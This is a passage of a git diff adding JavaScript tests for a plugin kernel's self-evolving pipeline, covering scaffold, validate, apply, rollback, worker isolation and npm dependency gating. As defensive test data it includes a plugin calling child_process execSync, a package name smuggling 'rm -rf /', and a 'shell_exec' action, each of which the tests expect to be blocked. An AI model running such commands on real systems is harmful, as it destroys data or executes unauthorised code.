@@ -21,7 +21,7 @@ import {estimateCostUsd} from "../runtime/usage-ledger.mjs";
 import {AcpDriver} from "../runtime/acp-driver.mjs";
 import {CliBridgeDriver} from "../runtime/cli-bridge-driver.mjs";
 import {createDevToolsHub} from "../runtime/dev-tools-hub.mjs";
-import {PluginKernel, validatePluginManifest, negotiateCapabilities} from "../runtime/plugin-kernel.mjs";
+import {PluginKernel, validatePluginManifest, negotiateCapabilities, validateSduiTree, startPluginControlServer} from "../runtime/plugin-kernel.mjs";
 import {registerBuiltinHostPlugins} from "../runtime/plugin-builtins.mjs";
 import {reviewResourceBundle, computeBundleSha256} from "../runtime/ai-reviewer.mjs";
 import {CommunityRegistryClient} from "../runtime/community-registry.mjs";
@@ -1140,6 +1140,966 @@ async function testCommunityRegistryAndAiReviewer() {
   }
 }
 
+async function testSelfEvolvingPluginPipeline() {
+  const tmpHome = fs.mkdtempSync(path.join(os.tmpdir(), "galiais-self-evolve-"));
+  const wsDir = path.join(tmpHome, "workspace");
+  fs.mkdirSync(wsDir, {recursive: true});
+  fs.writeFileSync(path.join(wsDir, "README.md"), "# Demo\n", "utf8");
+
+  const notifications = [];
+  const kernel = new PluginKernel({
+    home: tmpHome,
+    onNotify: (method, params) => notifications.push({method, params}),
+  });
+  registerBuiltinHostPlugins(kernel, {
+    agentRuntime: {kind: "agentRuntime"},
+    usageLedger: {kind: "usageLedger"},
+    extSync: {kind: "extSync"},
+    devTools: {kind: "devTools"},
+    envSsh: {kind: "envSsh"},
+    worktreeMgr: {kind: "worktreeMgr"},
+    communityRegistry: {kind: "communityRegistry"},
+  });
+  await kernel.boot();
+
+  const sockPath = process.platform === "win32"
+    ? `\\\\.\\pipe\\solbraid-plugctl-test-${process.pid}-${Date.now()}`
+    : path.join(tmpHome, ".galiais", "run", "plugin-ctl.sock");
+  const tokenFile = path.join(tmpHome, ".galiais", "run", "plugin-ctl.token");
+  const ctlSrv = await startPluginControlServer(kernel, {socketPath: sockPath, tokenFile});
+
+  const mcpProc = spawn(process.execPath, [path.join(rootDir, "runtime", "plugin-mcp.mjs")], {
+    stdio: ["pipe", "pipe", "pipe"],
+    env: {
+      ...process.env,
+      HOME: tmpHome,
+      SOLBRAID_PLUGIN_CTL_SOCKET: sockPath,
+      SOLBRAID_PLUGIN_CTL_TOKEN: ctlSrv.token,
+    },
+  });
+  const rl = createInterface({input: mcpProc.stdout});
+  const pending = new Map();
+  let seq = 1;
+  rl.on("line", line => {
+    if (!line.trim()) return;
+    const msg = JSON.parse(line);
+    const waiter = pending.get(msg.id);
+    if (waiter) {
+      pending.delete(msg.id);
+      waiter.resolve(msg);
+    }
+  });
+  const rpc = (method, params = {}) => new Promise((resolve, reject) => {
+    const id = seq++;
+    const timer = setTimeout(() => { pending.delete(id); reject(new Error(`MCP timeout: ${method}`)); }, 15_000);
+    pending.set(id, {resolve: v => { clearTimeout(timer); resolve(v); }});
+    mcpProc.stdin.write(JSON.stringify({jsonrpc: "2.0", id, method, params}) + "\n");
+  });
+  const callTool = async (name, args = {}) => {
+    const resp = await rpc("tools/call", {name, arguments: args});
+    assert.ok(resp.result, `MCP ${name} must return result`);
+    const parsed = JSON.parse(resp.result.content[0].text);
+    return {isError: Boolean(resp.result.isError), data: parsed};
+  };
+
+  try {
+    // 1. MCP initialize & tools/list 必须完整暴露 14 个自进化运维工具
+    const initResp = await rpc("initialize", {protocolVersion: "2025-06-18"});
+    assert.equal(initResp.result.serverInfo.name, "solbraid-plugin-ctl");
+    const listTools = await rpc("tools/list");
+    assert.equal(listTools.result.tools.length, 14);
+
+    // 2. list 验证控制通道就绪与内置插件输入栏快捷动作
+    const listed0 = await callTool("solbraid_plugin_list");
+    assert.equal(listed0.isError, false);
+    assert.equal(listed0.data.agentControlAvailable, true);
+    assert.ok(listed0.data.composerActions.some(a => a.pluginId === "solbraid.builtin.workspace-inspector" && a.id === "workspace-inspect"));
+
+    // 3. scaffold 生成新插件并立即热激活
+    const scaffolded = await callTool("solbraid_plugin_scaffold", {
+      id: "local.evolve.demo",
+      name: "自进化测试插件",
+      description: "v0.1 初始脚手架",
+    });
+    assert.equal(scaffolded.isError, false);
+    assert.equal(scaffolded.data.plugin.status, "active");
+    assert.equal(scaffolded.data.plugin.version, "0.1.0");
+
+    // 4. validate 门禁：拦截核心覆写、语法错误与恶意 child_process
+    const vCore = await callTool("solbraid_plugin_validate", {
+      pluginId: "solbraid.core.agent-runtime",
+      manifest: {manifestVersion: "1.0.0", apiVersion: ">=1.0.0 <2.0.0", id: "solbraid.core.agent-runtime", name: "fake", version: "9.9.9", entrypoint: "index.mjs", capabilities: {required: [], optional: []}},
+      files: {"index.mjs": "export function activate() {}"},
+    });
+    assert.equal(vCore.data.ok, false);
+    assert.ok(vCore.data.errors.some(e => e.includes("核心内核插件")));
+
+    const vSyntax = await callTool("solbraid_plugin_validate", {
+      pluginId: "local.evolve.demo",
+      manifest: {manifestVersion: "1.0.0", apiVersion: ">=1.0.0 <2.0.0", id: "local.evolve.demo", name: "坏语法", version: "0.2.0", entrypoint: "index.mjs", capabilities: {required: [], optional: []}},
+      files: {"index.mjs": "export function activate( { broken syntax"},
+    });
+    assert.equal(vSyntax.data.ok, false);
+    assert.ok(vSyntax.data.errors.some(e => e.includes("语法错误")));
+
+    const vMalicious = await callTool("solbraid_plugin_validate", {
+      pluginId: "local.evolve.demo",
+      manifest: {manifestVersion: "1.0.0", apiVersion: ">=1.0.0 <2.0.0", id: "local.evolve.demo", name: "越权插件", version: "0.2.0", entrypoint: "index.mjs", capabilities: {required: ["commands"], optional: []}},
+      files: {"index.mjs": `import {execSync} from "node:child_process"; export function activate(){ execSync("id"); }`},
+    });
+    assert.equal(vMalicious.data.ok, false);
+    assert.ok(vMalicious.data.errors.some(e => e.includes("安全拦截")));
+
+    // 5. apply 热升级至 v0.2.0（新增 hooks.prompt + ui.composerAction + rpc + panel + command）
+    const v2Manifest = {
+      manifestVersion: "1.0.0",
+      apiVersion: ">=1.0.0 <2.0.0",
+      id: "local.evolve.demo",
+      name: "自进化测试插件",
+      version: "0.2.0",
+      description: "v0.2 升级版",
+      kind: "local",
+      entrypoint: "index.mjs",
+      capabilities: {
+        required: ["commands", "ui.panel", "ui.composerAction", "hooks.prompt", "rpc", "storage.local"],
+        optional: [],
+      },
+    };
+    const v2Code = [
+      `export async function activate(ctx) {`,
+      `  ctx.log.info("v0.2.0 evolved activated");`,
+      `  ctx.commands.register("ping", {`,
+      `    description: "返回版本与参数",`,
+      `    handler: ({args}) => ({kind: "notice", message: "PONG_V2:" + (args || "ok")}),`,
+      `  });`,
+      `  ctx.panels.register({`,
+      `    id: "dash",`,
+      `    title: "自进化面板",`,
+      `    render: () => "<html><body><h1>EVOLVED_V2_PANEL</h1></body></html>",`,
+      `  });`,
+      `  ctx.composer.registerAction({`,
+      `    id: "quick-v2",`,
+      `    label: "自进化动作",`,
+      `    description: "一键触发 v2 命令",`,
+      `    command: "ping",`,
+      `  });`,
+      `  ctx.rpc.register("echo", params => ({echoed: params?.msg || "empty", version: "0.2.0"}));`,
+      `  ctx.hooks.onBeforePrompt(({text}) => ({text: text + " [evolved-v2]", notice: "已附加 v2 上下文"}));`,
+      `  ctx.hooks.onAfterResponse(({text}) => ({notice: "响应字数:" + String(text || "").length}));`,
+      `}`,
+    ].join("\n");
+
+    const applied = await callTool("solbraid_plugin_apply", {
+      pluginId: "local.evolve.demo",
+      manifest: v2Manifest,
+      files: {"index.mjs": v2Code},
+      note: "升级至 v0.2.0 增加 Hook 与输入栏动作",
+    });
+    assert.equal(applied.data.ok, true);
+    assert.equal(applied.data.rolledBack, false);
+    assert.ok(applied.data.snapshotId);
+    assert.equal(applied.data.plugin.version, "0.2.0");
+    assert.equal(applied.data.plugin.status, "active");
+    assert.equal(applied.data.plugin.snapshotCount, 1);
+    assert.equal(applied.data.plugin.composerActions.length, 1);
+    assert.ok(notifications.some(n => n.method === "plugins/changed" && n.params?.pluginId === "local.evolve.demo"));
+
+    // 6. 现场烟测 command / panel / rpc 以及 Prompt Hooks
+    const tCmd = await callTool("solbraid_plugin_test", {pluginId: "local.evolve.demo", kind: "command", target: "ping", args: "hello"});
+    assert.equal(tCmd.data.ok, true);
+    assert.equal(tCmd.data.result.message, "PONG_V2:hello");
+
+    const tPanel = await callTool("solbraid_plugin_test", {pluginId: "local.evolve.demo", kind: "panel", target: "dash"});
+    assert.equal(tPanel.data.ok, true);
+    assert.ok(tPanel.data.result.preview.includes("EVOLVED_V2_PANEL"));
+
+    const tRpc = await callTool("solbraid_plugin_test", {pluginId: "local.evolve.demo", kind: "rpc", target: "echo", params: {msg: "hi"}});
+    assert.equal(tRpc.data.ok, true);
+    assert.equal(tRpc.data.result.echoed, "hi");
+
+    const beforeRes = await kernel.runBeforePromptHooks({agentId: "codex", sessionId: "s1", cwd: wsDir, text: "hello"});
+    assert.equal(beforeRes.text, "hello [evolved-v2]");
+    assert.equal(beforeRes.notices.length, 1);
+    const afterRes = await kernel.runAfterResponseHooks({agentId: "codex", sessionId: "s1", cwd: wsDir, text: "reply", stopReason: "end_turn"});
+    assert.equal(afterRes.notices[0].message, "响应字数:5");
+
+    // 7. 注入激活期运行时崩溃代码 -> 必须自动原子回滚到 v0.2.0 且不影响在线可用性
+    const crashApply = await callTool("solbraid_plugin_apply", {
+      pluginId: "local.evolve.demo",
+      manifest: {...v2Manifest, version: "0.3.0"},
+      files: {"index.mjs": `export function activate() { throw new Error("boom-on-v3-activate"); }\n`},
+      note: "有缺陷的 v0.3.0",
+    });
+    assert.equal(crashApply.data.ok, false);
+    assert.equal(crashApply.data.rolledBack, true);
+    assert.ok(String(crashApply.data.error).includes("boom-on-v3-activate"));
+    const afterCrashList = await callTool("solbraid_plugin_list");
+    const recovered = afterCrashList.data.plugins.find(p => p.id === "local.evolve.demo");
+    assert.equal(recovered.status, "active");
+    assert.equal(recovered.version, "0.2.0");
+
+    // 8. 源码快照查询与手工回滚至 v0.1.0
+    const snapsRes = await callTool("solbraid_plugin_snapshots", {pluginId: "local.evolve.demo"});
+    assert.ok(snapsRes.data.snapshots.length >= 1);
+    const v1Snap = snapsRes.data.snapshots.find(s => s.version === "0.1.0");
+    assert.ok(v1Snap, "v0.1.0 snapshot must exist");
+    const rolled = await callTool("solbraid_plugin_rollback", {pluginId: "local.evolve.demo", snapshotId: v1Snap.id});
+    assert.equal(rolled.data.ok, true);
+    assert.equal(rolled.data.restoredVersion, "0.1.0");
+    assert.equal(rolled.data.plugin.version, "0.1.0");
+
+    // 9. 非核心内置插件覆写与一键恢复原版
+    const overrideBuiltin = await callTool("solbraid_plugin_apply", {
+      pluginId: "solbraid.builtin.workspace-inspector",
+      manifest: {
+        manifestVersion: "1.0.0",
+        apiVersion: ">=1.0.0 <2.0.0",
+        id: "solbraid.builtin.workspace-inspector",
+        name: "工作区体检（Agent 升级版）",
+        version: "2.0.0",
+        description: "覆写后的增强版",
+        kind: "local",
+        entrypoint: "index.mjs",
+        capabilities: {required: ["commands"], optional: []},
+      },
+      files: {
+        "index.mjs": `export function activate(ctx) { ctx.commands.register("inspect", { description: "增强体检", handler: () => ({kind: "notice", message: "OVERRIDDEN_BUILTIN_V2"}) }); }\n`,
+      },
+      note: "覆写 workspace-inspector 内置插件",
+    });
+    assert.equal(overrideBuiltin.data.ok, true);
+    assert.equal(overrideBuiltin.data.plugin.overriddenBuiltin, true);
+    const tOver = await callTool("solbraid_plugin_test", {pluginId: "solbraid.builtin.workspace-inspector", kind: "command", target: "inspect"});
+    assert.equal(tOver.data.result.message, "OVERRIDDEN_BUILTIN_V2");
+
+    const restoredBuiltin = await callTool("solbraid_plugin_rollback", {
+      pluginId: "solbraid.builtin.workspace-inspector",
+      restoreBuiltin: true,
+    });
+    assert.equal(restoredBuiltin.data.ok, true);
+    assert.equal(restoredBuiltin.data.restoredBuiltin, true);
+    assert.equal(restoredBuiltin.data.plugin.overriddenBuiltin, false);
+    const tOrig = await callTool("solbraid_plugin_test", {pluginId: "solbraid.builtin.workspace-inspector", kind: "panel", target: "overview", cwd: wsDir});
+    assert.equal(tOrig.data.ok, true);
+    assert.equal(tOrig.data.result.title, "工作区体检看板");
+    assert.ok(tOrig.data.result.preview.includes("工作区体检看板"));
+
+    // 10. 验证 extension-sync 自动向三大引擎投影 solbraid_plugin_ctl MCP 与 solbraid-plugin-sdk Skill
+    const prevHome = process.env.HOME;
+    try {
+      process.env.HOME = tmpHome;
+      // 模拟 Antigravity 首次运行时创建的 0 字节空 mcp_config.json，确保仍能正确投影
+      fs.mkdirSync(path.join(tmpHome, ".gemini", "config"), {recursive: true});
+      fs.writeFileSync(path.join(tmpHome, ".gemini", "config", "mcp_config.json"), "", "utf8");
+      const extSyncMod = await import(`../runtime/extension-sync.mjs?test=${Date.now()}`);
+      await extSyncMod.syncExtensions({registry: {mcpServers: [], skills: [], instructions: [], subagents: [], hooks: [], plugins: []}, secrets: {}});
+      const codexToml = fs.readFileSync(path.join(tmpHome, ".codex", "config.toml"), "utf8");
+      assert.ok(codexToml.includes("solbraid_plugin_ctl"), "Codex config.toml must include solbraid_plugin_ctl");
+      assert.ok(codexToml.includes("plugin-mcp.mjs"), "Codex config.toml must reference plugin-mcp.mjs");
+      const geminiMcp = JSON.parse(fs.readFileSync(path.join(tmpHome, ".gemini", "config", "mcp_config.json"), "utf8"));
+      assert.ok(geminiMcp.mcpServers?.solbraid_plugin_ctl, "Antigravity mcp_config.json must include solbraid_plugin_ctl");
+      const claudeMcps = await extSyncMod.loadMcpServersForClaude();
+      assert.ok(claudeMcps.solbraid_plugin_ctl, "Claude MCP loader must include solbraid_plugin_ctl");
+      const acpMcps = await extSyncMod.loadMcpServersForAcp("antigravity", wsDir);
+      assert.ok(acpMcps.some(s => s.name === "solbraid_plugin_ctl"), "ACP MCP loader must include solbraid_plugin_ctl");
+      assert.ok(fs.existsSync(path.join(tmpHome, ".galiais", "extensions", "builtin-skills", "plugin-sdk", "SKILL.md")));
+    } finally {
+      process.env.HOME = prevHome;
+    }
+    for (const shName of ["prepare-vm-runtime.sh", "prepare-proot-runtime.sh", "sync-hot-runtime.sh", "sync-hot-runtime-proot.sh"]) {
+      const shText = fs.readFileSync(path.join(rootDir, "runtime", shName), "utf8");
+      assert.ok(shText.includes("plugin-mcp.mjs"), `${shName} must deploy plugin-mcp.mjs`);
+      assert.ok(shText.includes("plugin-worker-host.mjs"), `${shName} must deploy plugin-worker-host.mjs`);
+    }
+  } finally {
+    mcpProc.kill();
+    await ctlSrv.close();
+    await kernel.dispose();
+    fs.rmSync(tmpHome, {recursive: true, force: true});
+  }
+}
+
+async function testPhase4CeilingCapabilities() {
+  // 1. SDUI AST 校验器防越界与非法节点
+  assert.equal(validateSduiTree({nodes: [{type: "evil_script"}]}).ok, false);
+  assert.equal(validateSduiTree({nodes: [{type: "button", label: "ok", action: {type: "shell_exec"}}]}).ok, false);
+  assert.equal(validateSduiTree({nodes: [{type: "button", label: "全屏跳转", action: {type: "navigate", route: "plugin://local.worker.suite/worker-home"}}]}).ok, true);
+  assert.equal(validateSduiTree({nodes: [{type: "metric", label: "文件", value: "42", tone: "accent"}]}).ok, true);
+
+  const tmpHome = fs.mkdtempSync(path.join(os.tmpdir(), "galiais-phase4-"));
+  const wsDir = path.join(tmpHome, "workspace");
+  fs.mkdirSync(wsDir, {recursive: true});
+  fs.writeFileSync(path.join(wsDir, "hello.kt"), "fun main() {}\n", "utf8");
+
+  // 使用较短激活超时（1200ms），验证同步死循环 Worker 强杀速度与隔离性
+  const kernel = new PluginKernel({home: tmpHome, activateTimeoutMs: 1200});
+  registerBuiltinHostPlugins(kernel, {
+    agentRuntime: {kind: "agentRuntime"},
+    usageLedger: {kind: "usageLedger"},
+    extSync: {kind: "extSync"},
+    devTools: {kind: "devTools"},
+    envSsh: {kind: "envSsh"},
+    worktreeMgr: {kind: "worktreeMgr"},
+    communityRegistry: {kind: "communityRegistry"},
+  });
+  await kernel.boot();
+
+  const sockPath = process.platform === "win32"
+    ? `\\\\.\\pipe\\solbraid-phase4-test-${process.pid}-${Date.now()}`
+    : path.join(tmpHome, ".galiais", "run", "plugin-ctl.sock");
+  const tokenFile = path.join(tmpHome, ".galiais", "run", "plugin-ctl.token");
+  const ctlSrv = await startPluginControlServer(kernel, {socketPath: sockPath, tokenFile});
+
+  const mcpProc = spawn(process.execPath, [path.join(rootDir, "runtime", "plugin-mcp.mjs")], {
+    stdio: ["pipe", "pipe", "pipe"],
+    env: {
+      ...process.env,
+      HOME: tmpHome,
+      SOLBRAID_PLUGIN_CTL_SOCKET: sockPath,
+      SOLBRAID_PLUGIN_CTL_TOKEN: ctlSrv.token,
+    },
+  });
+  const rl = createInterface({input: mcpProc.stdout});
+  const pending = new Map();
+  let seq = 1;
+  rl.on("line", line => {
+    if (!line.trim()) return;
+    const msg = JSON.parse(line);
+    const waiter = pending.get(msg.id);
+    if (waiter) { pending.delete(msg.id); waiter.resolve(msg); }
+  });
+  const callTool = (name, args = {}) => new Promise((resolve, reject) => {
+    const id = seq++;
+    const timer = setTimeout(() => { pending.delete(id); reject(new Error(`MCP timeout: ${name}`)); }, 15_000);
+    pending.set(id, {resolve: v => { clearTimeout(timer); resolve({isError: Boolean(v.result?.isError), data: JSON.parse(v.result.content[0].text)}); }});
+    mcpProc.stdin.write(JSON.stringify({jsonrpc: "2.0", id, method: "tools/call", params: {name, arguments: args}}) + "\n");
+  });
+
+  try {
+    // 2. 内置插件原生 Compose SDUI 表面测试
+    const builtinSdui = await callTool("solbraid_plugin_test_sdui", {
+      pluginId: "solbraid.builtin.workspace-inspector",
+      surfaceId: "native-health",
+      cwd: wsDir,
+    });
+    assert.equal(builtinSdui.data.ok, true);
+    assert.equal(builtinSdui.data.title, "工作区原生概览");
+    assert.ok(builtinSdui.data.nodeCount >= 6);
+
+    // 3. 启动全能力 worker-isolated 线程隔离插件（SDUI + 多槽位 + 可执行动态驱动 + 协议转换器 + deps.npm）
+    const workerManifest = {
+      manifestVersion: "1.0.0",
+      apiVersion: ">=1.0.0 <2.0.0",
+      id: "local.worker.suite",
+      name: "线程隔离全能力插件",
+      version: "1.0.0",
+      description: "运行在独立 worker_threads 的全能力插件",
+      kind: "local",
+      executionTier: "worker-isolated",
+      entrypoint: "index.mjs",
+      capabilities: {
+        required: ["commands", "rpc", "ui.sdui", "ui.slot", "agent.driver", "provider.translator", "deps.npm", "storage.local"],
+        optional: [],
+      },
+    };
+    const workerCode = [
+      `export async function activate(ctx) {`,
+      `  ctx.log.info("worker suite booted in " + ctx.host.executionTier);`,
+      `  ctx.commands.register("wping", { description: "Worker 命令", handler: ({args}) => ({kind: "notice", message: "WORKER_OK:" + (args || "1")}) });`,
+      `  ctx.rpc.register("add", async ({a = 1, b = 2}) => ({sum: Number(a) + Number(b)}));`,
+      `  ctx.ui.registerSurface({`,
+      `    id: "worker-home", title: "线程原生页",`,
+      `    render: async () => ({ title: "线程原生页", nodes: [{type: "metric", label: "模式", value: "Worker", tone: "success"}] }),`,
+      `  });`,
+      `  ctx.ui.registerSlot({`,
+      `    id: "home-card", slot: "home.banner", label: "线程卡片", surfaceId: "worker-home",`,
+      `    render: async () => ({ title: "来自 Worker 首页卡片", nodes: [{type: "text", text: "安全运行在独立线程", style: "body", tone: "ink"}] }),`,
+      `  });`,
+      `  ctx.ui.registerSlot({ id: "top-pill", slot: "chat.topbar", label: "状态", badge: "Worker", surfaceId: "worker-home" });`,
+      `  ctx.ui.registerSlot({ id: "msg-btn", slot: "chat.messageFooter", label: "整理要点", command: "wping" });`,
+      `  ctx.ui.registerSlot({ id: "dyn-tab", slot: "nav.tab", label: "实验室", surfaceId: "worker-home" });`,
+      `  ctx.ui.registerSlot({ id: "comp-bar", slot: "chat.composerBar", label: "快填", command: "wping" });`,
+      `  ctx.ui.registerSlot({ id: "files-btn", slot: "files.toolbar", label: "检视", surfaceId: "worker-home" });`,
+      `  ctx.ui.registerSlot({ id: "term-btn", slot: "terminal.toolbar", label: "快查", command: "wping" });`,
+      `  ctx.ui.registerSlot({ id: "set-sec", slot: "settings.section", label: "设置卡", render: () => ({ title: "设置扩展", nodes: [{type: "text", text: "OK"}] }) });`,
+      `  ctx.ui.registerSlot({ id: "float-orb", slot: "global.overlay", label: "悬浮球", badge: "ORB", surfaceId: "worker-home", routes: ["home", "chat"], alignment: "bottomStart", offsetX: 12, offsetY: -120, draggable: true, displayMode: "fab" });`,
+      `  ctx.ui.registerSlot({ id: "home-takeover", slot: "home.replace", label: "自定义首页", surfaceId: "worker-home" });`,
+      `  ctx.drivers.register({`,
+      `    id: "local-echo-agent", name: "本地回声引擎", protocol: "plugin-driver", description: "动态可执行驱动",`,
+      `    listModels: () => [{id: "echo-v1", label: "Echo v1"}],`,
+      `    execute: async ({prompt, emitThought, emitChunk}) => {`,
+      `      emitThought("正在思考：" + prompt);`,
+      `      emitChunk("ECHO_PART_1:");`,
+      `      emitChunk(prompt);`,
+      `      return {stopReason: "end_turn"};`,
+      `    },`,
+      `  });`,
+      `  ctx.providers.registerTranslator({`,
+      `    id: "custom-wire", name: "自定义协议", baseProtocol: "openai_chat",`,
+      `    toUpstream: (req) => ({ path: "/v2/infer", headers: {"x-custom-wire": "1"}, body: {promptText: req.prompt || "hi"} }),`,
+      `    fromUpstream: (res) => ({ choices: [{message: {role: "assistant", content: "TRANSLATED:" + (res.out || "")}}] }),`,
+      `  });`,
+      `}`,
+    ].join("\n");
+
+    const appliedWorker = await callTool("solbraid_plugin_apply", {
+      pluginId: "local.worker.suite",
+      manifest: workerManifest,
+      files: {"index.mjs": workerCode},
+      note: "部署 worker-isolated 全能力插件",
+    });
+    assert.equal(appliedWorker.data.ok, true, JSON.stringify(appliedWorker.data));
+    assert.equal(appliedWorker.data.plugin.executionTier, "worker-isolated");
+    assert.equal(appliedWorker.data.plugin.status, "active");
+    assert.equal(appliedWorker.data.plugin.surfaces.length, 1);
+    assert.equal(appliedWorker.data.plugin.uiSlots.length, 10);
+    const orbSlot = appliedWorker.data.plugin.uiSlots.find(s => s.id === "float-orb");
+    assert.equal(orbSlot?.slot, "global.overlay");
+    assert.deepEqual(orbSlot?.routes, ["home", "chat"]);
+    assert.equal(orbSlot?.alignment, "bottomStart");
+    assert.equal(orbSlot?.offsetX, 12);
+    assert.equal(orbSlot?.offsetY, -120);
+    assert.equal(orbSlot?.draggable, true);
+    assert.equal(orbSlot?.displayMode, "fab");
+    assert.equal(appliedWorker.data.plugin.translators.length, 1);
+
+    // 4. 在独立 Worker 内验证命令、RPC、SDUI、槽位渲染、动态驱动与协议转换器
+    const wCmd = await callTool("solbraid_plugin_test", {pluginId: "local.worker.suite", kind: "command", target: "wping", args: "42"});
+    assert.equal(wCmd.data.result.message, "WORKER_OK:42");
+    const wRpc = await callTool("solbraid_plugin_test", {pluginId: "local.worker.suite", kind: "rpc", target: "add", params: {a: 19, b: 23}});
+    assert.equal(wRpc.data.result.sum, 42);
+    const wSdui = await callTool("solbraid_plugin_test_sdui", {pluginId: "local.worker.suite", surfaceId: "worker-home"});
+    assert.equal(wSdui.data.ok, true);
+    const slotRes = await kernel.renderSlot({pluginId: "local.worker.suite", slotId: "home-card", cwd: wsDir});
+    assert.equal(slotRes.hidden, false);
+    assert.equal(slotRes.title, "来自 Worker 首页卡片");
+
+    const tDrv = await callTool("solbraid_plugin_test_driver", {kind: "driver", id: "local-echo-agent", prompt: "solbraid"});
+    assert.equal(tDrv.data.ok, true);
+    assert.equal(tDrv.data.models.length, 1);
+    assert.equal(tDrv.data.result.text, "ECHO_PART_1:solbraid");
+    assert.deepEqual(tDrv.data.result.thoughts, ["正在思考：solbraid"]);
+
+    const tTr = await callTool("solbraid_plugin_test_driver", {
+      kind: "translator", id: "custom-wire", request: {prompt: "hello"}, response: {out: "world"},
+    });
+    assert.equal(tTr.data.ok, true);
+    assert.equal(tTr.data.translatedRequest.path, "/v2/infer");
+    assert.equal(tTr.data.translatedResponse.choices[0].message.content, "TRANSLATED:world");
+
+    // 5. 同步死循环强杀隔离测试：向 worker-isolated 注入 while(true){}，宿主必须在 1.2s 内强杀线程并自动回滚，主微内核零阻塞
+    const hangApply = await callTool("solbraid_plugin_apply", {
+      pluginId: "local.worker.hang",
+      manifest: {
+        manifestVersion: "1.0.0", apiVersion: ">=1.0.0 <2.0.0",
+        id: "local.worker.hang", name: "死循环强杀测试", version: "0.1.0",
+        kind: "local", executionTier: "worker-isolated", entrypoint: "index.mjs",
+        capabilities: {required: [], optional: []},
+      },
+      files: {"index.mjs": `export function activate() { while (true) {} }\n`},
+      note: "故意死循环测试强杀",
+    });
+    assert.equal(hangApply.data.ok, false);
+    assert.equal(hangApply.data.rolledBack, true);
+    assert.ok(String(hangApply.data.error).includes("强制终止隔离线程"), `Unexpected hang error: ${hangApply.data.error}`);
+    // 主事件循环与其它插件仍完全存活响应
+    const aliveCheck = await callTool("solbraid_plugin_test", {pluginId: "local.worker.suite", kind: "rpc", target: "add", params: {a: 2, b: 3}});
+    assert.equal(aliveCheck.data.result.sum, 5);
+
+    // 6. 受控 npm 依赖安装门禁（拦截注入包名 + 允许合法 dryRun）
+    const badDep = await callTool("solbraid_plugin_install_deps", {pluginId: "local.worker.suite", packages: ["zod; rm -rf /"], dryRun: true});
+    assert.equal(badDep.isError, true);
+    const okDep = await callTool("solbraid_plugin_install_deps", {pluginId: "local.worker.suite", packages: ["zod@3.24.0"], dryRun: true});
+    assert.equal(okDep.isError, false);
+    assert.equal(okDep.data.ok, true);
+
+    // 7. Studio 渲染器热覆写管理（语法拦截 + 自动快照 + 回滚 + 重置）
+    const badJs = await callTool("solbraid_studio_override", {action: "apply", fileName: "artifact-renderer.js", content: "function broken( {"});
+    assert.equal(badJs.isError, true);
+    const ov1 = await callTool("solbraid_studio_override", {action: "apply", fileName: "artifact-renderer.js", content: "/* v1 */ window.__ov = 1;\n"});
+    assert.equal(ov1.data.applied, true);
+    const ov2 = await callTool("solbraid_studio_override", {action: "apply", fileName: "artifact-renderer.js", content: "/* v2 */ window.__ov = 2;\n"});
+    assert.equal(ov2.data.applied, true);
+    assert.ok(ov2.data.snapshotId);
+    const rb = await callTool("solbraid_studio_override", {action: "rollback", fileName: "artifact-renderer.js", snapshotId: ov2.data.snapshotId});
+    assert.equal(rb.data.rolledBack, true);
+    const rd = await callTool("solbraid_studio_override", {action: "read", fileName: "artifact-renderer.js"});
+    assert.ok(rd.data.content.includes("/* v1 */"));
+    const rst = await callTool("solbraid_studio_override", {action: "reset", fileName: "artifact-renderer.js"});
+    assert.equal(rst.data.reset, true);
+    assert.deepEqual(rst.data.activeOverrides, []);
+  } finally {
+    mcpProc.kill();
+    await ctlSrv.close();
+    await kernel.dispose();
+    fs.rmSync(tmpHome, {recursive: true, force: true});
+  }
+}
+
+async function testAuditRegressionAndCrossProcessE2E() {
+  const tmpHome = fs.mkdtempSync(path.join(os.tmpdir(), "galiais-audit-e2e-"));
+  const kernel = new PluginKernel({home: tmpHome, activateTimeoutMs: 2500});
+  await kernel.boot();
+
+  const sockPath = process.platform === "win32"
+    ? `\\\\.\\pipe\\solbraid-audit-e2e-${process.pid}-${Date.now()}`
+    : path.join(tmpHome, ".galiais", "run", "plugin-ctl.sock");
+  const tokenFile = path.join(tmpHome, ".galiais", "run", "plugin-ctl.token");
+  const ctlSrv = await startPluginControlServer(kernel, {socketPath: sockPath, tokenFile});
+
+  const mcpProc = spawn(process.execPath, [path.join(rootDir, "runtime", "plugin-mcp.mjs")], {
+    stdio: ["pipe", "pipe", "pipe"],
+    env: {
+      ...process.env,
+      HOME: tmpHome,
+      SOLBRAID_PLUGIN_CTL_SOCKET: sockPath,
+      SOLBRAID_PLUGIN_CTL_TOKEN: ctlSrv.token,
+    },
+  });
+  const mcpRl = createInterface({input: mcpProc.stdout});
+  const mcpPending = new Map();
+  let mcpSeq = 1;
+  mcpRl.on("line", line => {
+    if (!line.trim()) return;
+    const msg = JSON.parse(line);
+    const w = mcpPending.get(msg.id);
+    if (w) { mcpPending.delete(msg.id); w.resolve(msg); }
+  });
+  const callTool = (name, args = {}) => new Promise((resolve, reject) => {
+    const id = mcpSeq++;
+    const timer = setTimeout(() => { mcpPending.delete(id); reject(new Error(`MCP timeout: ${name}`)); }, 15_000);
+    mcpPending.set(id, {resolve: v => { clearTimeout(timer); resolve({isError: Boolean(v.result?.isError), data: JSON.parse(v.result.content[0].text)}); }});
+    mcpProc.stdin.write(JSON.stringify({jsonrpc: "2.0", id, method: "tools/call", params: {name, arguments: args}}) + "\n");
+  });
+
+  // 模拟第三方自定义协议上游服务器
+  const upstreamCalls = [];
+  const upstream = http.createServer((req, res) => {
+    let raw = "";
+    req.on("data", c => { raw += c; });
+    req.on("end", () => {
+      upstreamCalls.push({url: req.url, headers: req.headers, body: raw ? JSON.parse(raw) : null});
+      res.writeHead(200, {"Content-Type": "application/json"});
+      res.end(JSON.stringify({out: `UPSTREAM_OK:${req.url}:${req.headers["x-custom-wire"] || ""}`}));
+    });
+  });
+  await new Promise(r => upstream.listen(0, "127.0.0.1", r));
+  const upPort = upstream.address().port;
+
+  // 拉起真实 provider-gateway.mjs 子进程，注入测试用插件控制通道
+  const gw = spawn(process.execPath, [path.join(rootDir, "runtime", "provider-gateway.mjs")], {
+    env: {
+      ...process.env,
+      HOME: tmpHome,
+      USERPROFILE: tmpHome,
+      SOLBRAID_PLUGIN_CTL_SOCKET: sockPath,
+      SOLBRAID_PLUGIN_CTL_TOKEN: ctlSrv.token,
+    },
+    stdio: ["pipe", "pipe", "pipe"],
+  });
+  const gwRl = createInterface({input: gw.stdout, crlfDelay: Infinity});
+  const gwPending = new Map();
+  let gwSeq = 1;
+  gwRl.on("line", line => {
